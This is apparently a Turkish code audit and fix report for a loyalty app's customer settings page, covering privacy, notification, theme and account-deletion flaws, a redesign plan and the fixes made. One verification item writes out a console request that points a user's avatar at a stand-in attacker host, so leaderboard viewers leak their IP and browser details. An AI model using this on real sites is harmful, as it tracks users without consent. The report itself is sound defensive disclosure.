- **Kanıt:** `page.tsx:50` müşteri sayfasında `@/lib/admin-toast` kullanılıyor; bu, mesajların başına "Basarili: ", "Dikkat: ", "Bilgi: " ekliyor (Türkçe karakter yok, `lib/admin-toast.ts:15-19`). Vitrin `sonner`'ı doğrudan kullanıyor (`showcase-selector.tsx:5`). Dil İngilizce seçilse bile çoğu toast Türkçe (`page.tsx:221,238,308,353…`).
- **Öneri:** Müşteri paneli için i18n'li ve önek koymayan bir `customerToast` yaz (ya da `sonner`'ı doğrudan kullan). Başarı durumlarında oyunlaştırma diliyle kısa mikro-geri bildirim ver (ör. ✓ ikonlu satır içi "Kaydedildi" rozeti).
- **Efor:** S

### B14 — Vitrin/çerçeve rengi uçlarında doğrulama eksik
- **Önem:** düşük · **Kategori:** güvenlik / sağlamlık
- **Kanıt:** `api/customer/custom-color/route.ts:21-27` `customFrameColor` tipini ve uzunluğunu doğrulamadan DB'ye yazıyor. `api/customer/showcase/route.ts:66` gövde dizi değilse `.length` hatası verip 500 döner. İkisinde de rate-limit yok.
- **Öneri:** zod şemaları ekle (`customFrameColor: z.union([z.null(), z.string().regex(/^\d{1,3}$/)])`, id dizileri `z.array(z.string().cuid()).max(4)`).
- **Efor:** S

---

## Eksik özellikler (kıyas ürünlerle)

1. **Hesap özeti ve kimlik başlığı** (Starbucks Rewards / Revolut profil): avatar + çerçeve + seviye/lig + üyelik tarihi + "QR kartım" kısayolu tek bir kahraman kartında. Bugün profil düz bir form.
2. **Push bildirim abonelik merkezi**: tarayıcı/PWA izin durumu, "bu cihazda bildirimleri aç", sessiz saatler ve günlük özet sıklığı (Duolingo hatırlatma saati). Push anahtarları var ama abone olma yolu yok.
3. **Oturum ve cihaz yönetimi**: aktif oturumlar, son giriş yeri/zamanı, "diğer tüm cihazlardan çık", şifre değişince otomatik oturum iptali (Monzo/Revolut).
4. **Bağlı hesaplar**: Google bağla/kopar, e-posta değiştirme (doğrulama kodlu). Bugün e-posta için "destek ile iletişime geçin" deniyor ama bağlantı yok.
5. **Pazarlama izni (ETK/KVKK açık rıza) ayrı ve kayıtlı**: ticari ileti onayı, rıza tarihi ve kaynağıyla birlikte; işlemsel bildirimlerden ayrılmış olsun.
6. **Gizlilik modu ve görünürlük önizlemesi**: "Diğerleri seni böyle görüyor" önizlemesi, liderlikte takma ad/anonim mod, arkadaş ve squad görünürlüğü (Spotify / Duolingo).

---

## Yeniden tasarım vizyonu

**Hedef deneyim:** "Ayarlar" bir form yığını değil, kullanıcının **oyuncu kimliğinin kontrol merkezi** olmalı. Her anahtar gerçek bir şeyi değiştirmeli ve değişiklik anında, geri alınabilir şekilde (undo toast) hissedilmeli. Kaydet butonu yalnızca metin alanlarında olsun; anahtarlar autosave ile çalışsın.

**Yerleşim (mobil öncelikli):**
- **Üst kahraman kartı:** çerçeveli avatar (kuşanılmış çerçeve + hue), ad, seviye/lig rozeti, "Profili düzenle" butonu. Dokununca alt sayfa (sheet) açılır: avatar ızgarası, ad, doğum günü (kilitliyse salt okunur).
- **Gruplu liste (iOS Settings / Revolut deseni):** Hesap · Bildirimler · Gizlilik · Görünüm ve Erişilebilirlik · Güvenlik · Verilerim. Her satırda bir sağ özet var ("Push: Açık · 3 tür kapalı", "2FA: Aktif"). Masaüstünde sol menü + sağ panel, URL `?section=` ile derin bağlantılı.
- **Bildirimler:** tek matris (tür × kanal). Türler gerçek olay kataloğundan gelsin (rozet, yanıt, kampanya, hatırlatma, ekip, doğum günü/hediye), en üstte "Bu cihazda push" ana anahtarı ve izin durumu, sessiz saatler. Eski kart kaldırılsın.
- **Vitrin ve süslemeler:** Ayarlardan çıkıp profil/koleksiyon alanına taşınsın (bkz. çakışmalar). Ayarlarda yalnızca bir kısayol kalsın.
- **Verilerim:** "İndir" (arka planda hazırlanır, e-posta ile gelir) + "Hesabı sil" (kayıp özeti → yeniden doğrulama → 30 gün geri alma).

**Motion/3D (ölçülü):** Ayarlar ekranı yardımcı bir ekran, 3B gerekmez. Önerilen mikro-etkileşimler:
- Kahraman kartında çerçeve hue değişiminde yumuşak renk geçişi (CSS `filter` transition).
- Anahtar değişiminde satır sonunda 150 ms'lik "✓ kaydedildi" fade'i.
- Sheet'ler için `layout` geçişleri.
- Sekme başına `y:10` giriş animasyonu kaldırılmalı (her sekme değişiminde tekrar ediyor, `page.tsx:545-548` vb.).
- Tüm hareketler uygulama içi "Animasyonları azalt" tercihine bağlansın.

**Veri / API değişiklikleri:**
- `GET/PATCH /api/me/preferences`: tipli `UserPreferences` (tema, dil, görünürlük, a11y, bildirim matrisi), alan bazlı PATCH, `updatedAt` ile iyimser kilit.
- `lib/notify.ts` tek gönderim noktası + `NOTIFICATION_GROUPS`'un gerçek olay kataloğuna genişletilmesi; ESLint kuralıyla doğrudan `notification.create`/`sendPushNotification` yasaklansın.
- Leaderboard/profil sorgularında `leaderboardVisible`/`profilePublic` filtresi.
- `PATCH /api/user/profile`: rol bazlı alan seti + avatar allowlist.
- `POST /api/me/sensitive-action` (yeniden doğrulama token'ı, 5 dk) → silme, e-posta değişimi, 2FA kapatma bunu şart koşsun.
- `GET /api/me/sessions` + `DELETE /api/me/sessions/:id` (Redis token-replay katmanı üzerinden iptal).
- Export: Inngest işi + R2 + süreli bağlantı.

---

## Çakışmalar / birleştirme önerisi

- **Tema:** Başlıktaki tema anahtarı (`components/dashboard/header.tsx:81-106`) gerçek; ayarlardaki seçici sahte kopya → ayarlar `next-themes`'e bağlansın ya da kaldırılsın.
- **Vitrin & Süslemeler sekmesi** ↔ `/customer/shop` (çerçeve kuşanma) ↔ `/customer/badges` (rozet koleksiyonu) ↔ müşteri panosu (vitrin gösterimi, `components/customer/dashboard/customer-dashboard.tsx:335-347`). Bir "ayar" değil, kimlik/koleksiyon özelliği → `/customer/badges` (koleksiyon) ya da yeni bir "Profilim" sayfasında birleştirilmesi önerilir; ayarlarda kısayol kalsın.
- **Doğum günü kartı** ↔ layout'taki `CustomerBirthdayBonusHost` (aynı talep akışı iki yerde, aynı GET iki kez) → talep tek bileşende toplansın, ayarlar yalnızca tarihi yönetsin.
- **`components/settings/privacy-security.tsx`** (kullanılmıyor) ↔ bu sayfanın Güvenlik ve Gizlilik sekmeleri: işlevsel kopya. i18n'li ve push'lu olan bu bileşenin iyi parçaları (push aboneliği, dialog'lu 2FA kapatma) alınıp dosya silinmeli.
- **`/dealer/settings`**: Erişilebilirlik bileşeni zaten paylaşılıyor; profil, güvenlik ve gizlilik bölümleri de rol-bağımsız paylaşılan `components/settings/*` bölümlerine çıkarılırsa iki panel aynı güvenlik düzeltmelerinden birlikte yararlanır.
- Sayfa **kaldırılmamalı**: hesap merkezi zorunlu. Önerilen yaklaşım yeniden tasarlamak ve vitrin kısmını ayarlardan dışarı taşımak.

---

## Doğrulama (şüpheci inceleme)

Salt okunur inceleme; kod değiştirilmedi, DB'ye/servislere dokunulmadı. Her iddia çağıran ve çağrılan taraflarıyla birlikte (sayfa → API → lib → Prisma şeması → `proxy.ts`/`next.config`) yeniden okundu.

### 1. Tema "Sistem" seçilince tüm tercih kaydı 400 ile başarısız oluyor — **DOĞRULANDI**
- `app/customer/settings/page.tsx:992` `<SelectItem value="system">`, `:983` seçimi doğrudan `preferences.theme`'e yazıyor.
- `app/customer/settings/page.tsx:423` `handleSavePreferences` tüm `preferences` nesnesini (dil, tema, `showProfile`, `showLeaderboard`, 3 a11y alanı) tek gövdede yolluyor.
- `app/api/customer/settings/route.ts:53` `theme: z.enum(['dark','light'])`, `:62` ve `:85` `.strict()`; `:166-171` ilk zod hatasının mesajını (`parsed.error.errors[0]?.message`) 400 ile dönüyor. zod `^3.22.4` (`package.json:104`) için bu mesaj İngilizce "Invalid enum value. Expected 'dark' | 'light', received 'system'" olur; `page.tsx:434` bunu olduğu gibi `toast.error`'a basıyor.
- `preferences.theme` başka hiçbir yerde okunmuyor (repo genelinde grep: yalnızca `page.tsx:982`), `setTheme`/`useTheme` sayfada yok. Seçici, sunucu reddetmese bile görünür etkisi olmayan bir alan.
- **Yeniden üretim:** Tercihler sekmesi → Dil = English, Tema = Sistem → "Tercihleri Kaydet" → İngilizce zod hata toast'u; sayfa yenilendiğinde dil hâlâ `tr`, gizlilik/a11y anahtarları da eski değerde. Kullanıcı Koyu/Açık'a dönmeden hiçbir tercihini kaydedemiyor.
- Not: Hata kalıcı değil (sistem değeri DB'ye yazılmadığı için yeniden yüklemede `dark` gelir), fakat sessizce tercih kaybettiren bir akış olduğu için YÜKSEK seviyesi yerinde.

### 2. Liderlik/profil gizlilik anahtarları ve kampanya/hatırlatma opt-out'u uygulanmıyor — **DOĞRULANDI** (hatırlatma kısmı kısmen)
- `showLeaderboard`/`showProfile` repo genelinde yalnızca `app/customer/settings/page.tsx` ve `app/api/customer/settings/route.ts`'te geçiyor. `user_settings_*` anahtarını okuyan tek diğer yer `lib/notify-email.ts:34` (e-posta bildirimleri; gizlilik değil).
- `app/api/leaderboard/route.ts:23-30` `USER_LB_SELECT` (`name`, `image`), `:47-52`, `:236-251`, `:284-296` sorgularında görünürlük filtresi yok; `app/customer/leaderboard/page.tsx:340,399,461,554` bu ad/avatarı tüm müşterilere çiziyor. "Liderlik Tablosunda Göster" kapalı olan kullanıcı listede kalmaya devam ediyor.
- `app/api/dealer/campaigns/[id]/send/route.ts:107-127` `notification.createMany` + `sendPushNotification`; `notificationPrefs`/`isChannelEnabled` kontrolü yok. `lib/push.ts` `sendPushNotification` içinde de tercih kontrolü bulunmuyor. Tercih kontrolü yapan yalnızca `lib/team-notify.ts:23-35` ve `lib/character-badges.ts:288-307`; `lib/notify-prefs-server.ts` `notifyRespectingPrefs` hiçbir yerden import edilmiyor.
- **Yeniden üretim:** Müşteri ayarlarda "Kampanya & Sürprizler" grubunun uygulama + push kanallarını kapatıp kaydeder → bu müşterinin geri bildirim bıraktığı bayi bir kampanyayı "Gönder"ler → müşteriye hem zil bildirimi hem push gider. Aynı şekilde "Liderlik Tablosunda Göster" kapalı kullanıcı `/customer/leaderboard`'da adı ve avatarıyla görünür.
- Hatırlatma kısmı: `lib/customer-reminders.ts:38-52,66-79` bildirimleri `data.kind` taşımıyor (yalnızca `module`/`nudgeType`); `kindToGroup` bunları zaten hiçbir gruba eşlemezdi. Yani sorun "tercih atlanıyor"dan çok "bu dürtmeler hiçbir gruba bağlanmamış". "Hatırlatmalar" grubunun açıklaması (`lib/notification-prefs.ts` "dönemsel hatırlatmalar") kullanıcıya bunların kapatılabileceğini düşündürdüğü için yine de vaat ihlali sayılır.
- Kampanya bildirimi ticari ileti niteliğinde olduğundan, açık opt-out'a rağmen gönderim ETK/İYS açısından gerçek bir uyum riski; seviye YÜKSEK yerinde.

### 3. Profil `image` alanı doğrulanmamış keyfi URL kabul ediyor — **DOĞRULANDI** (seviye: ORTA)
- `app/api/user/profile/route.ts:13` `image: z.string().max(2048).optional()` — şema, host veya avatar listesi kısıtı yok; `:47` doğrudan `prisma.user.update`. `requireAuth()` rol argümansız (`:29`), yani her giriş yapmış müşteri çağırabilir.
- `proxy.ts:24` CSP `img-src 'self' data: https: blob:` her https kaynağına izin veriyor. Liderlik sayfası `AvatarImage` (Radix, düz `<img>`) kullanıyor; `next/image` `remotePatterns` (`next.config` ~`:272`) burada devreye girmiyor.
- **Yeniden üretim:** Oturum açık müşteri DevTools'tan `fetch('/api/user/profile',{method:'PATCH',headers:{'Content-Type':'application/json'},body:JSON.stringify({image:'https://saldirgan.example/p.gif?u=1'})})` → liderlikte ilk sıralarda/listede görünen bu kullanıcının satırını açan her müşterinin tarayıcısı saldırganın sunucusuna istek atar (IP, User-Agent, zaman damgası sızar) ya da uygunsuz görsel gösterilir.
- Not: `<img src>` bağlamında `javascript:` çalışmaz, SVG data URI'si script çalıştırmaz; XSS yok. Etki gizlilik sızıntısı + içerik moderasyonu ile sınırlı; bu yüzden KRİTİK değil ORTA–YÜKSEK arası değerlendirilmeli.

### 4. Hesap silme yeniden kimlik doğrulamasız; onay e-postası placeholder'da — **DOĞRULANDI** (sertleştirme bulgusu; placeholder alt maddesi zayıf)
- `app/api/user/delete-account/route.ts:10-12` yalnızca `confirmEmail`; `:27-30` sadece e-posta eşleşmesi. Şifre, 2FA (şemada `twoFactorEnabled` mevcut, `prisma/schema.prisma:233-235`) ya da taze oturum kontrolü yok. Buna karşılık şifre değişimi `currentPassword` istiyor (`page.tsx:361-368`) — daha az yıkıcı işlem daha sıkı korunuyor.
- `:33-39` `feedback.updateMany` ve `user.delete` transaction dışında. Ancak şemadaki `User`'a işaret eden 111 ilişkinin tamamı `Cascade` (91) veya `SetNull` (20); `Restrict`/`NoAction` yok, dolayısıyla `user.delete`'in FK nedeniyle düşüp yarım iş bırakması olası değil. Bu alt madde pratikte düşük risk.
- Placeholder (`page.tsx:1126`): Doğru, ama aynı e-posta zaten Profil sekmesinde açıkça görünüyor (`page.tsx:627`, `:657`); placeholder ek bir sır sızdırmıyor, yalnızca "yazma sürtünmesini" azaltıyor. Tek başına güvenlik bulgusu değil, UX tercihi.
- CSRF: JSON gövdeli `DELETE` çapraz kökenden ön uçuş (preflight) gerektirir; next-auth çerezi + CORS yokluğu ile CSRF senaryosu kurulamadı.
- **Yeniden üretim:** Paylaşılan/ödünç cihazda açık kalmış oturum → Ayarlar → Gizlilik → "Hesabı sil" → Profil sekmesindeki e-postayı yaz → hesap, puanlar, rozetler ve tüm cascade veriler geri dönüşsüz silinir; 2FA açık olsa da sorulmaz.
- Değerlendirme: Bulgu gerçek, ancak tehdit modeli "oturuma zaten erişmiş saldırgan" olduğundan KRİTİK değil YÜKSEK bir sertleştirme maddesi. Öneri raporun üst kısmındaki `POST /api/me/sensitive-action` (şifre veya 2FA ile 5 dk'lık yeniden doğrulama token'ı) ile tutarlı; ek olarak soft-delete + 7–14 günlük geri alma penceresi ve silme sonrası tüm oturumların Redis token-replay katmanı üzerinden iptali önerilir.

---

## Uygulama (Dalga 2)

**Hedef rota:** `/customer/me/settings` (Ben → Ayarlar). Eski `/customer/settings` artık sorguyu koruyarak `permanentRedirect` yapan tek satırlık sunucu bileşeni; eski sekme adları (`?tab=preferences` → `appearance`, `?tab=cosmetics` → `profile`) yeni sayfada kanonik adrese yönlenir, `?tab=privacy` derin linkleri (KVKK e-postası, yasal sayfalar) çalışmaya devam eder.

**Mimari:** sunucu bileşeni (`requireAuth(['CUSTOMER'])`, yetki DB'den) → tek paralel okuma modeli `lib/customer-settings/load.server.ts` → küçük istemci adası `components/customer/m-ayarlar/settings-experience.tsx` (`initialData`, pencere odağında yeniden çekme yok). Beş bölüm (`Profil · Bildirimler · Gizlilik · Görünüm · Güvenlik`) `SectionTabs` ile URL'de (`?tab=`); her bölüm ayrı `next/dynamic` parçası (2FA'nın QR kütüphanesi yalnız kurulumda yüklenir). QDL v2 ops kaydı (`PanelPage register="ops"`, düz `surface-1` kartlar, glow yok). Hareket yalnız durum değişimini anlatır: satır sonu "Kaydedildi" göstergesi, çerçeve tonunda `filter` geçişi; azaltılmış harekette CSS ile kapanır. Sekme başına `y:10` giriş animasyonu kaldırıldı. Yazımlar `lib/http/define-route.ts` ile (rol + zod + hız sınırı); alan bazlı autosave, iyimser güncelleme, hata olursa geri alma.

**Yeni uçlar:** `GET /api/customer/me/settings`, `PATCH …/preferences`, `PATCH …/notifications` (tek hücre), `PATCH …/profile`, `POST …/sessions`, `DELETE …/push-devices/:id`. Yeniden yazılanlar: `/api/customer/settings` (geriye uyum katmanı; m-lig kullanıyor), `/api/customer/custom-color`, `/api/user/delete-account` (+ `GET` kayıp özeti). Testler: `__tests__/lib/customer-settings.test.ts` (14), `__tests__/api/customer-settings-routes.test.ts` (19), `__tests__/api/user-erasure.test.ts` (+2 yeniden doğrulama senaryosu).

### Özellik envanteri: yeni durum

| # | Özellik | Yeni durum | Not |
|---|---|---|---|
| 1 | Masaüstü sayfa başlığı | ÇALIŞIYOR | Tek `PageHeader` (h1), mobilde de görünür |
| 2 | Mobil başlık kartı | KALDIRILDI | Kopya başlık gereksiz: `PageHeader` her genişlikte görünür |
| 3 | Sekme çubuğu | ÇALIŞIYOR | `SectionTabs`: etiketler her genişlikte görünür, ≥44px, ok tuşları, URL'de durum |
| 4 | Avatar önizleme + baş harf | ÇALIŞIYOR | Kuşanılmış çerçeve ve renk tonuyla birlikte |
| 5 | Hover "kamera" butonu | KALDIRILDI | Dokunmatikte ve klavyede görünmüyordu; yerine görünür "Avatarı değiştir" butonu |
| 6 | Avatar kategori seçimi | ÇALIŞIYOR | `ChoiceChips` radyo grubu |
| 7 | Avatar ızgarası | ÇALIŞIYOR | `aria-pressed`, "Kategori · Avatar N" adı, hash'li WebP |
| 8 | "Avatar Değiştir" | ÇALIŞIYOR | Seçim diyalogda onaylanınca sunucuya yazılır |
| 9 | Ad Soyad | ÇALIŞIYOR | Oturum yenilemesi yazılanı silmez (B5); kirli çubuk + ayrılma uyarısı; `htmlFor` bağlı |
| 10 | E-posta + destek | ÇALIŞIYOR | Salt okunur; "düzeltme başvurusu" bağlantısı KVKK düzeltme akışına götürür |
| 11 | Profil kaydet | ÇALIŞIYOR | Sunucuda avatar izin listesi (B3); hata kodu kullanıcının dilinde; denetim kaydı |
| 12 | Doğum günü yükleniyor | ÇALIŞIYOR | Veri sunucuda; ayrı yükleme yok |
| 13 | Doğum günü "Talep et" | KALDIRILDI (taşındı) | Talep tek yerde: Cüzdan › Kartım. Ayarlar, doğum günü bugünse oraya yönlendirir |
| 14 | "Bu yıl alındı" | ÇALIŞIYOR | Talep nedeni sunucudan (`ALREADY_CLAIMED`, `TOO_RECENT`) |
| 15 | Yıllık bonus ipucu | ÇALIŞIYOR | Puan matrisinden |
| 16 | Doğum tarihi | ÇALIŞIYOR | Kayıtlıysa salt okunur; ilk kayıt onay penceresiyle; `min/max` (B11) |
| 17 | Bildirim türleri matrisi | ÇALIŞIYOR | Yalnız uygulanan hücreler (katalog); sahte hücreyi sunucu 400 ile reddeder |
| 18 | "Tercihleri Kaydet" (matris) | KALDIRILDI | Yerine hücre başına autosave + geri alma |
| 19 | Eski "Rozet Kazandığımda" e-posta | KALDIRILDI | `emailBadgeEarned` fonksiyonunu çağıran yok (artık sahte) |
| 20–23 | Eski kart görev/ödül/push anahtarları | KALDIRILDI | Hiçbir gönderici okumuyordu |
| 24 | Eski kart "Kaydet" | KALDIRILDI | Kart kaldırıldı |
| 25 | İşletme yanıtı e-postası opt-out | ÇALIŞIYOR | Matriste "İşletme yanıtları · E-posta" (notify-email okur) |
| 26 | Push aboneliği yönetimi | ÇALIŞIYOR | "Bu cihazda" aç/kapat, izin ve destek durumu, bildirim alan cihazlar listesi (tek tek kapatılabilir) |
| 27 | 2FA kurulum | ÇALIŞIYOR | QR + elle anahtar + OTP alanı |
| 28 | Kurtarma kodları | ÇALIŞIYOR | Kopyala, `.txt` indir, kodla yeniden üret, kalan sayı |
| 29 | 2FA kapat | ÇALIŞIYOR | `window.prompt` yerine erişilebilir diyalog; Google girişi de 2FA soruyor (lib/auth, B6) |
| 30 | Şifre kartı başlığı | ÇALIŞIYOR | Ham i18n anahtarı yok (B9) |
| 31 | Şifre değiştir | ÇALIŞIYOR | `<form>`, `autocomplete`, göster/gizle, güç göstergesi; diğer oturumlar düşer |
| 32 | İlk şifre oluştur | ÇALIŞIYOR | |
| 33 | Oturumlar / her yerden çıkış | ÇALIŞIYOR | "Diğer cihazlardan çık" (sessionVersion artar, bu cihazın çerezi yenilenir) ve "Her yerden çık"; bu cihaz etiketi, oturum başlangıcı, son toplu çıkış. Ayrıntılı cihaz listesi için ŞEMA İSTEĞİ var |
| 34 | Dil seçimi | ÇALIŞIYOR | Hesaba ve cihaza anında; yüzey metinleri TR/EN |
| 35 | Tema seçimi | ÇALIŞIYOR | Gerçek `next-themes` (Açık/Koyu/Sistem, cihaz başına); "Sistem" artık 400 vermiyor (B1) |
| 36 | "Profili Göster" | KALDIRILDI | Hiçbir sorgu okumuyor; tüketicisiz ayar |
| 37 | "Liderlikte göster" | ÇALIŞIYOR | Lig ve liderlik sorguları uyguluyor; Gizlilik › Görünürlük |
| 38 | Yüksek kontrast | ÇALIŞIYOR | Autosave; ilk boyamadan önce uygulanır |
| 39 | Animasyonları azalt | ÇALIŞIYOR | Motion politikası (framer, konfeti, canvas, video) uygulama ayarını okuyor; OS tercihi notu |
| 40 | Renk körü modu | ÇALIŞIYOR | |
| 41 | "Tercihleri Kaydet" | KALDIRILDI | Yerine anahtar başına autosave; erişilebilirlik artık sonraki ziyarette geri alınmıyor |
| yeni | Yazı boyutu | ÇALIŞIYOR | Normal/Büyük/Çok büyük (kök font-size), hesaba kayıt |
| 42–52 | Vitrin ve çerçeve sekmesi | TAŞINDI | Çerçeve renk tonu Profil'de (doğrulamalı; çerçeve yoksa Ödüller bağlantılı boş durum). 4 slotluk vitrin düzenleyicisi ayarlardan çıktı: rozetler `/customer/me/badges`'te, süsler Ödüller'de sabitleniyor. Profil'de doluluk + kısayol |
| 53 | Veri indirme | ÇALIŞIYOR | E1 KVKK merkezi: tam envanter, kanıtlı erişim başvurusu (B8) |
| 54 | Hesap silme | ÇALIŞIYOR | Kayıp özeti + yeniden doğrulama (şifre / 2FA / taze giriş); yer tutucuda e-posta yok; büyük/küçük harf duyarsız; hız sınırı (B4) |
| 55 | Silme sonrası çıkış | ÇALIŞIYOR | |
| 56 | Yükleme hatası | ÇALIŞIYOR | `QueryState` hata + yeniden dene; varsayılan değerlerle form açılmaz (B7) |
| 57 | Toast'lar | ÇALIŞIYOR | Önekli admin toast'ı yok; çoğu geri bildirim satır içi + canlı bölge (B13) |
| 58 | Sekmeye derin bağlantı | ÇALIŞIYOR | `?tab=` (eski adlar dahil) |

### Kapanan bulgular (14/14)
- **B1** Tema sahteydi, "Sistem" 400 veriyordu. Seçici next-themes'e bağlandı; eski uç `system` değerini kabul ediyor; tüketicisiz `theme` saklanmıyor.
- **B2** Gizlilik ve bildirim anahtarlarının çoğu sahteydi. Tüketicisi olmayan anahtarlar kaldırıldı. Matris yalnız uygulanan hücreleri gösteriyor, sunucu da yalnız onları yazdırıyor. Eksik uygulamalar tamamlandı: hatırlatma dürtmeleri (`lib/customer-reminders.ts`) ve sürpriz rozet bildirimi (`lib/surprise-badges.ts`) artık tercihe uyuyor. Kampanya push ve uygulama içi kanalı `lib/marketing-delivery` ile Dalga 1'den beri uygulanıyordu.
- **B3** Keyfi avatar URL'si kabul ediliyordu. Yeni uçta ve paylaşılan `/api/user/profile` ucunda (yalnız CUSTOMER) izin listesi var.
- **B4** Hesap silme yeniden doğrulama istemiyordu. Artık şifre, 2FA ya da taze giriş zorunlu; hız sınırı ve kayıp özeti eklendi.
- **B5** Pencere odağı değişince yazılan ad siliniyordu. Kirli form senkronlanmıyor, odakta yeniden çekme yok.
- **B6** 2FA Google girişinde atlanıyordu. lib/auth'taki OAuth MFA adımı bunu kapatıyor; kart metni doğru, `prompt()` kalmadı.
- **B7** Yükleme hatasında varsayılanlar gösteriliyordu. Hata artık görünür; yazımlar alan bazlı ve advisory kilitli transaction içinde.
- **B8** Veri indirme eksikti. E1'in tam envanter paketi kullanılıyor.
- **B9** Ham i18n anahtarı görünüyordu. Kaldırıldı.
- **B10** Mimari dağınıktı. 1111 satırlık tek istemci bileşeninin yerine sunucu sayfası ve bölüm parçaları geldi. İki bildirim modeli tek katalogda birleşti. Ölü dosyalar silindi: `components/settings/privacy-security.tsx`, `hooks/use-push-notifications.ts`, `components/customer/showcase-selector.tsx`. Ayarların `Settings` tablosundan tipli tabloya taşınması için ŞEMA İSTEĞİ var.
- **B11** Doğum günü kilidi görünmüyordu, hatalar İngilizceydi, bonus aynı gün alınabiliyordu. Kart salt okunur ve onaylı; kurallar `lib/birthday` içinde (30 gün bekleme, İstanbul saati). Talep Kartım'da.
- **B12** Erişilebilirlik ve mobil eksikleri giderildi: etiketli sekmeler, `htmlFor`, `autocomplete`, gerçek formlar, ≥44px hedefler, tema token'ları (sabit koyu renk yok), hareket politikası.
- **B13** Toast tonu tutarsızdı. Önek kalktı, yüzey metinleri TR/EN.
- **B14** Çerçeve rengi doğrulanmıyordu. Artık zod (0–360), hız sınırı ve `defineRoute` var.

### Kalanlar (gerekçeli)
- **Silmede 14–30 gün geri alma (soft-delete):** `User.deletionRequestedAt` alanı yok, ŞEMA İSTEĞİ. Bugün anonimleştirme anında ve kanıtlı yapılıyor (P0-25).
- **Ayrıntılı oturum/cihaz listesi ve tekil oturum kapatma:** JWT oturumları kullanıcıya bağlı saklanmıyor (`SessionTokenUsage` tablosunda `userId` yok). ŞEMA İSTEĞİ: `SessionTokenUsage.userId` ve `deviceLabel`. Toplu iptal çalışıyor.
- **E-posta değiştirme (doğrulama kodlu) ve Google bağla/kopar:** ayrı bir kimlik akışı gerektiriyor. Bugünkü dürüst yol KVKK düzeltme başvurusu.
- **Sessiz saatler ve günlük özet:** bunları tüketecek gönderici yok, uydurma anahtar eklenmedi.
- **Ekip e-postası:** `lib/team-email.ts` tercihe bakmadığı için bu hücre gösterilmiyor.
- **KVKK merkezi metinleri** yalnız Türkçe. E1 bileşeni taşındı ama çevrilmedi.
- **`/api/user/data-export`** artık hiçbir ekranda kullanılmıyor (içeriği eksik eski uç). Bayi ya da yönetici tüketicisi olabileceği için silinmedi.
- **`lib/auth.ts` içindeki `jwt` update dalı** istemciden `image/points/level` kabul ediyor. Bu yalnız kişinin kendi token'ını etkiliyor, DB'ye yazmıyor. Paylaşılan auth dosyası olduğu için kimlik şeridine bırakıldı.
- **Görsel doğrulama** (headless tezgâh) bu dalgada yapılamadı, çünkü dev server ve build yasak. İlerleme tip denetimi ve jest ile doğrulandı.
